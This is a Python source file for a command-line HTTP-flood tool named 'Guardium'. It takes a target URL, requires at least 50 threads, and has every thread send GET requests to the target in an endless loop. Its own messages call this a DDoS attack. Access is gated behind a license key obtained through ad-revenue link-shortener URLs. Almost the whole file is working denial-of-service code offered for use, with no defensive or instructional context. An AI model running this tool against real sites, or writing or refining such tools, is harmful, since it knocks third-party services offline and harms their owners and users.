from colorama import Fore, Style, init
import random
import threading
import requests
import time
import sys
import signal

init(autoreset=True)

# Simulate a license key storage
license_key_stored = None  # Set to None initially or to a license key if one is entered

# Define variables to track thread success and failure
successful_threads = 0
failed_threads = 0
stop_threading = False

def signal_handler(sig, frame):
    global stop_threading
    stop_threading = True
    print(f"{Fore.RED}\nStopping all threads...{Fore.RESET}")

# Register signal handler for stopping threads
signal.signal(signal.SIGINT, signal_handler)

def display_title_and_version():
    title = """
 ██████╗ ██╗   ██╗ █████╗ ██████╗ ██████╗ ██╗██╗   ██╗███╗   ███╗
██╔════╝ ██║   ██║██╔══██╗██╔══██╗██╔══██╗██║██║   ██║████╗ ████║
██║  ███╗██║   ██║███████║██████╔╝██║  ██║██║██║   ██║██╔████╔██║
██║   ██║██║   ██║██╔══██║██╔══██╗██║  ██║██║██║   ██║██║╚██╔╝██║
╚██████╔╝╚██████╔╝██║  ██║██║  ██║██████╔╝██║╚██████╔╝██║ ╚═╝ ██║
 ╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═╝ ╚═════╝ ╚═╝     ╚═╝
    """
    version = "Version 1.0"
    developer_info = f"""
{Fore.LIGHTGREEN_EX}↳ {Fore.YELLOW}DEVELOPER    {Fore.RESET}: {Fore.CYAN}CadaZenith
{Fore.LIGHTGREEN_EX}↳ {Fore.YELLOW}EMAIL        {Fore.RESET}: {Fore.CYAN}zenith.fusionsphere@gmail.com
{Fore.LIGHTGREEN_EX}↳ {Fore.YELLOW}WEBSITE      {Fore.RESET}: {Fore.CYAN}www.codazenith.blogspot.com
{Fore.LIGHTGREEN_EX}↳ {Fore.YELLOW}PRICE        {Fore.RESET}: {Fore.CYAN}0$
    """
    print(f"{Fore.GREEN}{title}")
    print(f"{Fore.YELLOW}{version}")
    print(developer_info)

def display_menu(dashboard_option=False):
    print(f"\n{Fore.LIGHTCYAN_EX}[01] {Fore.WHITE}Target URL")
    print(f"{Fore.LIGHTCYAN_EX}[02] {Fore.WHITE}License Key")
    print(f"{Fore.LIGHTCYAN_EX}[03] {Fore.WHITE}Exit")
    if dashboard_option:
        print(f"{Fore.LIGHTCYAN_EX}[0] {Fore.WHITE}Dashboard/Home")

def check_license_key():
    if license_key_stored is None:
        print(f"{Fore.RED}Your license key: {Fore.LIGHTYELLOW_EX}N/A{Fore.RESET}")
        return False
    print(f"{Fore.GREEN}Your license key: {license_key_stored}{Fore.RESET}")
    return True

def enter_license_key():
    global license_key_stored
    license_key = input(f"{Fore.LIGHTBLUE_EX}Enter the License Key: {Fore.WHITE}")
    # Here you would have actual logic to validate and store the license key
    license_key_stored = license_key
    print(f"{Fore.GREEN}License Key entered successfully.{Fore.RESET}")
    print(f"{Fore.GREEN}Your license key: {license_key_stored}{Fore.RESET}")

def handle_license_key_choice():
    global license_key_stored

    # Display license key status
    if not check_license_key():
        # If license key is not set, proceed with obtaining a new one
        print(f"\n{Fore.LIGHTGREEN_EX}Please get your license key by opening one of these links and completing the shortener. All files are protected by a password. If asked, please enter access password: {Fore.CYAN}GuardiumCZ{Fore.RESET}")

        # Define random URLs and corresponding license keys
        urls = [
            ("https://instantearn.in/7bJwitqU", "CZGRmlyc3RMaWNlbnNlS2V5QEd1YXJkaXVt=="),
            ("https://instantearn.in/KgpsTc", "CZU2Vjb25kTGljZW5zZUtleUBHdWFyZGl1bQ=="),
            ("https://go.link4rev.site/uziyee", "CZVGhpcmRMaWNlbnNlS2V5QEd1YXJkaXVt=="),
            ("https://go.link4rev.site/7NRvy", "CZRm91ckxpY2Vuc2VLZXlAR3VhcmRpdW0==")
        ]

        random_url, correct_key = random.choice(urls)
        print(f"\n{Fore.LIGHTCYAN_EX}URL: {Fore.CYAN}{random_url}{Fore.RESET}")
        user_key = input(f"{Fore.LIGHTYELLOW_EX}Please enter your license key: {Fore.WHITE}")

        if user_key == correct_key:
            license_key_stored = user_key
            print(f"{Fore.GREEN}Successfully updated your license key.{Fore.RESET}")
            print(f"{Fore.GREEN}Your license key: {license_key_stored}{Fore.RESET}")
        else:
            print(f"{Fore.RED}Invalid license key. Please try again.{Fore.RESET}")

def validate_url(url):
    # Simple URL validation
    if not url.startswith("http://") and not url.startswith("https://"):
        return False
    if "localhost" in url or not (url.startswith("https://") or url.startswith("http://")):
        return False
    return True

def attack_target(url, thread_count, delay):
    global successful_threads, failed_threads, stop_threading

    def attack(thread_no):
        global successful_threads, failed_threads, stop_threading
        while not stop_threading:
            try:
                response = requests.get(url)
                if response.status_code == 200:
                    print(f"{Fore.GREEN}[Guardium] : {time.strftime('%H:%M:%S')} : {thread_no} successful{Fore.RESET}")
                    successful_threads += 1
                else:
                    print(f"{Fore.RED}⛔ [Guardium] : {time.strftime('%H:%M:%S')} : {thread_no} failed{Fore.RESET}")
                    failed_threads += 1
                time.sleep(delay)  # Adding delay between requests
            except requests.RequestException:
                print(f"{Fore.RED}⛔ [Guardium] : {time.strftime('%H:%M:%S')} : {thread_no} failed{Fore.RESET}")
                failed_threads += 1
                time.sleep(delay)  # Adding delay between requests

    print(f"{Fore.GREEN}🎯 [Guardium] : {time.strftime('%H:%M:%S')} : Attack started with {thread_count} threads{Fore.RESET}")

    for i in range(thread_count):
        thread = threading.Thread(target=attack, args=(i+1,))
        thread.start()

    # Wait for the threads to finish
    while not stop_threading:
        time.sleep(1)  # Check every second if threads should stop

    print(f"{Fore.GREEN}Your threading successfully done. Stats: Successful: {successful_threads}, Failed: {failed_threads}{Fore.RESET}")

def handle_target_url_choice():
    global stop_threading, successful_threads, failed_threads

    if not check_license_key():
        print(f"{Fore.RED}Ohh shit! We could not find the license key. First, please set the license key to run this command.{Fore.RESET}")
        return

    url = input(f"{Fore.LIGHTBLUE_EX}Please enter your targeted URL: {Fore.WHITE}")
    if not validate_url(url):
        print(f"{Fore.RED}Please enter a correct URL like https://example.com{Fore.RESET}")
        return

    try:
        thread_count = int(input(f"{Fore.LIGHTBLUE_EX}How many threads do you want to send (min 50): {Fore.WHITE}"))
        if thread_count < 50:
            print(f"{Fore.RED}Please enter threads above 50.{Fore.RESET}")
            return
    except ValueError:
        print(f"{Fore.RED}Invalid number of threads. Please enter a valid number.{Fore.RESET}")
        return

    try:
                delay = float(input(f"{Fore.LIGHTBLUE_EX}Please enter a delay between requests (in seconds): {Fore.WHITE}"))
    except ValueError:
        print(f"{Fore.RED}Invalid delay value. Please enter a valid number.{Fore.RESET}")
        return

    # Reset the threading and success/failure tracking
    stop_threading = False
    successful_threads = 0
    failed_threads = 0

    print(f"{Fore.GREEN}🎯 Successfully started a DDoS attack on {url} with {thread_count} threads and {delay} second(s) delay.{Fore.RESET}")

    # Start the attack
    attack_target(url, thread_count, delay)

    # After attack completion
    print(f"{Fore.GREEN}Your threading successfully done. Stats: Successful: {successful_threads}, Failed: {failed_threads}{Fore.RESET}")
    print(f"{Fore.LIGHTBLUE_EX}\nFor exit, press [0] to return to Dashboard/Home{Fore.RESET}")

    choice = input(f"{Fore.LIGHTBLUE_EX}Enter your choice: {Fore.WHITE}")
    if choice == "0":
        print(f"{Fore.LIGHTCYAN_EX}Redirecting to Dashboard/Home...{Fore.RESET}")
        # Redirect to the main menu/dashboard
        display_menu(dashboard_option=True)

def main():
    display_title_and_version()
    while True:
        display_menu()
        choice = input(f"{Fore.LIGHTBLUE_EX}\nEnter your choice: {Fore.WHITE}")

        if choice == "1":
            handle_target_url_choice()
        elif choice == "2":
            handle_license_key_choice()
        elif choice == "3":
            print(f"{Fore.LIGHTRED_EX}Exiting...{Fore.RESET}")
            sys.exit(0)
        elif choice == "0":
            display_menu(dashboard_option=True)
        else:
            print(f"{Fore.RED}Invalid choice. Please select a valid option.{Fore.RESET}")

if __name__ == "__main__":
    main()
